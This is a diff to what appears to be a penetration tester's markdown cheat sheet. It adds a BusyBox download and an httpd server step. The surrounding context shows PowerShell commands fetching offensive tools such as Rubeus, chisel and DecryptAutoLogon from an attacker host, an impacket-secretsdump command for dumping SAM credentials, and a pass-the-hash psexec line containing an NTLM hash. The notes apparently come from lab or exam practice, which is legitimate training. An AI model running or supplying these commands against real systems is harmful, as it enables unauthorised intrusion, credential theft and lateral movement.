@@ -16,6 +16,7 @@ iwr -uri http://192.168.45.200:8000/Rubeus.exe -o Rubeus.exe
 iwr -uri http://192.168.45.200:8000/chisel.exe -o chisel.exe
 iwr -uri http://192.168.45.200:8000/rustscan.exe -o rustscan.exe
 iwr -uri http://192.168.45.200:8000/DecryptAutoLogon.exe -o DecryptAutoLogon.exe
+iwr -uri http://192.168.45.200:8000/busybox.exe -o busybox.exe
 ```
 
 # File downloads(for Linux)
@@ -132,5 +133,13 @@ print(cmd)
 impacket-secretsdump -system SYSTEM -sam SAM LOCAL
 
 # impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.207.146
+```
+
+
+# BusyBox
+
+``` shell
+.\busybox.exe httpd
+
 ```
 
